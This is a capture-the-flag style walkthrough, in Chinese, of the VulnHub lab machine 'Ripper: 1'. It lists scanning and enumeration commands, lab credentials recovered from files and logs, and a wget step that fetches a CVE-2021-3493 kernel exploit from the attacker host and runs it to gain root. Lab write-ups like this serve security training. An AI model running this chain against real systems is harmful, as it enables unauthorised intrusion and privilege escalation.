靶机地址：[Ripper: 1 ~ VulnHub](https://vulnhub.com/entry/ripper-1,706/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.45
sudo nmap -p22,80,10000 -sV 192.168.1.45
# 22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
# 80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
# 10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
```
访问web服务看看，80是一个默认页面，10000是一个登录页面，简单试了一下没发现什么特别的
web路径扫描
```Shell
sudo dirsearch -u http://192.168.1.45
sudo dirsearch -u https://192.168.1.45:10000/
# /robots.txt
```
访问 `https://192.168.1.45:10000/robots.txt` ，包含如下内容
```
d2Ugc2NhbiBwaHAgY29kZXMgd2l0aCByaXBzCg==
```
解码后为
```
we scan php codes with rips.
```
发现80端口下存在 `/rips/` 路径，直接用输入框的默认值 `/var/www` 点击 `scan`
扫出一些漏洞，通过这个应用可以直接访问文件，`/var/www/html/rips/secret.php` 中包含如下内容
也可以搜索敏感词汇，如：`pass` 、`secret` 等
```php
<? echo "user name: ripper"
<? echo "pass: Gamespeopleplay"
```
用这个账号密码登录10000端口的页面，失败了，再试试SSH
```Shell
ssh ripper@192.168.1.45
```
成功了，尝试提权
```Shell
uname -a
# Linux ripper-min 5.4.0-42-generic #46~18.04.1-Ubuntu SMP Fri Jul 10 07:21:24 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
lsb_release -a
# Ubuntu 18.04.5 LTS

which gcc # not found
wget http://192.168.1.26:7331/exploit
./exploit
```
通过 [[20 CVE#CVE-2021-3493|CVE-2021-3493]] 成功提权

其它提权方式，发现还有一个用户 `cubes`
查看用户文件
```Shell
find / -user cubes -type f 2>/dev/null
# /mnt/secret.file

cat /mnt/secret.file
# -passwd : Il00tpeople
```
尝试切换到 `cubes` 用户
```Shell
su cubes
```
成功了
```Shell
ls -a
# .bash_history
cat .bash_history
# cp miniserv.error backup/miniser.log
find / -name miniser*.log 2>/dev/null
# /var/webmin/miniserv.log
# /var/webmin/backup/miniser.log
cat /var/webmin/miniserv.log
# cat: /var/webmin/miniserv.log: Permission denied
cat /var/webmin/backup/miniser.log
# [04/Jun/2021:11:33:16 -0400] [10.0.0.154] Authentication : session_login.cgi=username=admin&pass=tokiohotel
```
用这个账号尝试登录10000端口的服务，成功了
提供了一个Web终端，拥有root权限

